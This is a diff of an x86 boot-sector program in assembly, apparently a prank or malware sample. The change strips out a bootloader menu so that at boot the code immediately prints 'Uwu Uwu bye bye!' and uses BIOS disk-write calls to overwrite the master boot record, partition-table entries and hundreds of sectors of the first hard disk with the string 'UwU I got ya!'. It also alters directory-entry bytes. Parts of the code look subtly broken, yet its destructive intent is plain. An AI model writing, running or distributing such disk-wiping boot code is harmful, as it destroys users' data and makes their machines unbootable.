@@ -1,6 +1,6 @@
 [org 0x7C00]
 
-start:
+ikuyooo:
     mov ax, 0x07C0
     mov ds, ax
     mov es, ax
@@ -8,117 +8,30 @@ start:
     mov gs, ax
     mov ss, ax
 
-    call display_window
-    mov si, msg_title
-    call print_msg
+    mov si, sayonara_tehehe
+    call print_uwu
 
-    mov si, msg_menu
-    call print_msg
+    call uwu_payload
 
-    call get_key_input
-
-    cmp al, '1'
-    je load_kernel
-
-    cmp al, '2'
-    je exit_bootloader
-
-    cmp al, '3'
-    je system_info
-
-    cmp al, '4'
-    je exec_payload
-
-    mov si, msg_invalid
-    call print_msg
-    jmp start
-
-load_kernel:
-    mov si, msg_loading_kernel
-    call print_msg
-    jmp 0x1000
-
-exit_bootloader:
-    mov si, msg_exit
-    call print_msg
-halt:
     jmp halt
 
-system_info:
-    mov si, msg_system_info
-    call print_msg
-    mov si, msg_good_luck
-    call print_msg
-    jmp start
-
-print_msg:
+print_uwu:
     mov ah, 0x0E
     mov al, [si]
     int 0x10
     inc si
     cmp al, 0x00
-    jne print_msg
+    jne print_uwu
     ret
 
-get_key_input:
-    mov ah, 0x00
-    int 0x16
-    ret
+uwu_payload:
 
-display_window:
-    mov ah, 0x0F
-    mov bh, 0x00
-    mov bl, 0x0F
-    int 0x10
-    mov si, window_top_border
-    call print_msg
-    mov si, window_side_left
-    call print_msg
-    mov si, window_bottom_border
-    call print_msg
-    ret
-
-window_top_border:
-    db '+-------------------+', 0x0A, 0x00
-
-window_side_left:
-    db '|                   |', 0x0A, 0x00
-
-window_bottom_border:
-    db '+-------------------+', 0x0A, 0x00
-
-msg_title:
-    db 'Totally Normal Bootloader', 0x0A, 0x00
-
-msg_menu:
-    db '1. Load Kernel', 0x0A, 0x00
-    db '2. Exit', 0x0A, 0x00
-    db '3. System Info', 0x0A, 0x00
-    db '4. Exec Payload', 0x0A, 0x00
-    db 'Choose an option: ', 0x00
-
-msg_invalid:
-    db 'Invalid choice, try again.', 0x0A, 0x00
-
-msg_loading_kernel:
-    db 'Loading Kernel...', 0x0A, 0x00
-
-msg_exit:
-    db 'Exiting bootloader...', 0x0A, 0x00
-
-msg_system_info:
-    db 'System Info: x86 Bootloader', 0x0A, 0x00
-
-msg_good_luck:
-    db 'Have a nice day! I love you!', 0x0A, 0x00
-
-msg_payload:
-    db 'Executing payload... bye bye!', 0x0A, 0x00
-
-exec_payload:
-    mov si, msg_payload
-    call print_msg
-
+    mov si, uwu_key
+    mov cx, 5
+OwO_circle:
+    lodsb
+    xor [si-1], al
+    loop OwO_circle
 
     mov ax, 0x0000
     mov es, ax
@@ -133,12 +46,12 @@ exec_payload:
 
     mov si, 0x1BE
     mov cx, 4
-partition_loop:
+uwu_circle:
     mov di, 0x7C00
     mov dx, [si]
     add dx, [si+2]
     cmp dx, 0x0000
-    je next_partition
+    je tired_oWo
     mov ah, 0x03
     mov al, 0x01
     mov ch, [si+1]
@@ -146,35 +59,33 @@ partition_loop:
     mov dh, [si+3]
     mov dl, 0x80
     int 0x13
-    mov si, payload_signature
+    mov si, uwu_uwu
     mov di, 0x7C00
     mov cx, 512
     rep movsb
-next_partition:
+tired_oWo:
     add si, 16
-    loop partition_loop
+    loop uwu_circle
 
-    mov si, payload_signature
+    mov si, uwu_uwu
     mov di, 0x1BE
-    mov cx, 64  
+    mov cx, 64
     rep movsb
-
 
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x7C00
     mov ah, 0x03
-    mov al, 0xFF  
+    mov al, 0xFF
     mov ch, 0x00
     mov cl, 0x01
     mov dh, 0x00
     mov dl, 0x80
     int 0x13
-    mov si, payload_signature
+    mov si, uwu_uwu
     mov di, 0x7C00
-    mov cx, 512 * 255 
+    mov cx, 512 * 255
     rep movsb
-
 
     mov ax, 0x0000
     mov es, ax
@@ -186,7 +97,7 @@ next_partition:
     mov dh, 0x00
     mov dl, 0x80
     int 0x13
-    mov si, payload_signature
+    mov si, uwu_uwu
     mov di, 0x7C00
     mov cx, 512
     rep movsb
@@ -201,7 +112,7 @@ next_partition:
     mov dh, 0x00
     mov dl, 0x80
     int 0x13
-    mov si, payload_signature
+    mov si, uwu_uwu
     mov di, 0x7C00
     mov cx, 512
     rep movsb
@@ -216,7 +127,7 @@ next_partition:
     mov dh, 0x00
     mov dl, 0x80
     int 0x13
-    mov si, payload_signature
+    mov si, uwu_uwu
     mov di, 0x7C00
     mov cx, 512
     rep movsb
@@ -231,15 +142,94 @@ next_partition:
     mov dh, 0x00
     mov dl, 0x80
     int 0x13
-    mov si, payload_signature
+    mov si, uwu_uwu
     mov di, 0x7C00
     mov cx, 512
     rep movsb
 
+    mov si, 0x1BE
+    mov cx, 4
+oya_oya_OwO:
+    mov di, 0x7C00
+    mov dx, [si]
+    add dx, [si+2]
+    cmp dx, 0x0000
+    je tehehe_UwU
+    mov ah, 0x03
+    mov al, 0x01
+    mov ch, [si+1]
+    mov cl, [si+2]
+    mov dh, [si+3]
+    mov dl, 0x80
+    int 0x13
+    mov si, Ayaya_OwO
+    mov di, 0x7C00 + 44
+    mov cx, 11
+    rep movsb
+tehehe_UwU:
+    add si, 16
+    loop oya_oya_OwO
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 0x20
+    mov ch, 0x00
+    mov cl, 0x01
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    mov si, uwu_uwu
+    mov di, 0x7C00
+    mov cx, 512 * 32
+    rep movsb
+
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 0x20
+    mov ch, 0x00
+    mov cl, 0x01
+    mov dh, 0x00
+    mov dl, 0x80
+    int 0x13
+    mov si, 0x7C00
+    mov di, 0x7E00
+    mov cx, 512 * 32
+    rep movsb
+
+    mov si, 0x7E00
+    mov cx, 512 * 32 / 32
+etooo_ne_bleeh:
+    mov di, si
+    add di, 0x1C
+    mov al, [di]
+    cmp al, 0x00
+    je next_file
+    mov [di], 'u'
+    inc di
+    mov [di], 'w'
+    inc di
+    mov [di], 'u'
+    next_file:
+    add si, 32
+    loop etooo_ne_bleeh
+
     ret
 
-payload_signature:
-    db 'Payload Signature', 0x00
+sayonara_tehehe:
+    db 'Uwu Uwu bye bye! Tehehe...', 0x0A, 0x00
 
-times 510 - ($ - start) db 0
+uwu_uwu:
+    db 'UwU I got ya!', 0x00
+
+Ayaya_OwO:
+    db 'UwU', 0x00
+
+uwu_key:
+    db 'UwUo', 'OwOo', 'UwUo', 'OwOo', 'UwUo' 
+
+times 510 - ($ - ikuyooo) db 0
 dw 0xAA55
